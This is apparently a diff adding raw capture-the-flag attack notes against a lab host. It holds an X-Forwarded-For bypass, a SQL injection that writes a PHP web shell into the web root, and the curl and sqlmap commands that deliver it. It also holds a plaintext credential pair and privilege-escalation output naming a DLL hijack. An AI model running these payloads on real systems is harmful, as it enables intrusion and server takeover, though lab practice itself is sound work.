@@ -1,0 +1,80 @@
+Request:
+OPTIONS /admin.php HTTP/1.1
+Host: 10.10.10.167
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+HTTP/1.1 200 OK
+Allow: OPTIONS, TRACE, GET, HEAD, POST
+Server: Microsoft-IIS/10.0
+Public: OPTIONS, TRACE, GET, HEAD, POST
+Date: Fri, 20 Dec 2019 16:52:04 GMT
+Connection: close
+Content-Length: 0
+
+
+
+at 10.10.10.167/admin.php
+add a header:
+X-Forwarded-For: 192.168.4.28
+
+the IP came from the index.php page source code.
+
+ '  union select 1, 2, 3, 4, 5, version()-- -
+
+
+this worked :
+' union select "<?php system($_GET['cmd']); ?>",2,3,4,5,6 into outfile 'C:\\inetpub\\wwwroot\\bad.php' #
+
+curl -d "@web_cmd.txt" -X POST http://10.10.10.167/search_products.php -H "X-Forwarded-For: 192.168.4.28"
+
+web_cmd = productName=' union select "<?php system($_GET['cmd']); ?>",2,3,4,5,6 into outfile 'C:\\inetpub\\wwwroot\\thisistest.php' #
+
+
+echo "productName=' union select \"<?php system(\$_GET['cmd']); ?>\",2,3,4,5,6 into outfile 'C:\\\inetpub\\\wwwroot\\\thisistest.php' #" > test.txt
+
+
+sqlmap -r POST_attack -p productName
+
+hector:l33th4x0rhector
+
+
+
+===============================
+
+
+[*] Checking for unattended install files...
+
+
+UnattendPath : C:\Windows\Panther\Unattend.xml
+
+
+[*] Checking %PATH% for potentially hijackable DLL locations...
+
+
+ModifiablePath    : C:\Users\Hector\AppData\Local\Microsoft\WindowsApps
+IdentityReference : CONTROL\Hector
+Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
+%PATH%            : C:\Users\Hector\AppData\Local\Microsoft\WindowsApps
+AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Hector\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'
+
+
+
+
+
+
+
+PS C:\bug> cat (Get-PSReadlineOption).HistorySavePath
+cat (Get-PSReadlineOption).HistorySavePath
+get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
+get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
+
+
+
+
+$acl = get-acl HKLM:\SYSTEM\CurrentControlSet\Services
+ConvertFrom-SddlString -Sddl $acl.Sddl
